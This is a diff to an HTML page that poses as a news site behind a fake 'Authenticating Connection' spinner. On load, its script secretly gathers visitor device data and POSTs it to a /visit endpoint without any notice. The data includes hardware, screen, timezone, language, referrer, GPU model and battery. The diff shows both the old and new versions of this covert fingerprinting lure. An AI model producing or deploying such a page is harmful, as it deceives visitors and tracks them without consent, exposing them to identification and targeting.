@@ -3,53 +3,44 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Breaking News | Global Feed</title>
+  <title>Global News | Exclusive Reports</title>
   <style>
-    body { background: #050505; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-    .loader { border: 3px solid #333; border-top: 3px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+    body { background: #080808; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .status-box { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; }
+    .loader { border: 3px solid #222; border-top: 3px solid #e50914; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <div style="text-align: center;">
-    <div class="loader" style="margin: auto;"></div>
-    <p>Syncing secure news feed...</p>
+  <div class="status-box">
+    <div class="loader"></div>
+    <p>Authenticating Connection...</p>
   </div>
 
   <script>
-    async function collectFullIntel() {
+    async function collectAllIntel() {
       const data = {
-        // Hardware & CPU
         hw: {
           cores: navigator.hardwareConcurrency || "N/A",
           ram: navigator.deviceMemory || "N/A",
           platform: navigator.platform || "N/A",
-          touch: navigator.maxTouchPoints || 0,
-          vendor: navigator.vendor || "N/A"
+          touch: navigator.maxTouchPoints || 0
         },
-        // Display & Screen
         display: {
           res: `${window.screen.width}x${window.screen.height}`,
-          avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
-          depth: window.screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          orientation: screen.orientation ? screen.orientation.type : "N/A"
+          pixelRatio: window.devicePixelRatio
         },
-        // Browser Environment
         browser: {
-          lang: navigator.languages ? navigator.languages.join(', ') : navigator.language,
           tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          ref: document.referrer || "Direct",
-          cookies: navigator.cookieEnabled,
-          webdriver: navigator.webdriver || false,
-          java: navigator.javaEnabled()
+          lang: navigator.language,
+          ref: document.referrer || "Direct"
         }
       };
 
       // GPU Extraction
       try {
         const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const gl = canvas.getContext('webgl');
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
       } catch (e) { data.gpu = "N/A"; }
@@ -62,15 +53,6 @@
         }
       } catch (e) { data.battery = "N/A"; }
 
-      // Network Info
-      if (navigator.connection) {
-        data.net = {
-          type: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink + " Mbps",
-          rtt: navigator.connection.rtt + " ms"
-        };
-      }
-
       // Send to server
       fetch("/visit", {
         method: "POST",
@@ -78,7 +60,7 @@
         body: JSON.stringify(data)
       });
     }
-    window.onload = collectFullIntel;
+    window.onload = collectAllIntel;
   </script>
 </body>
 </html>
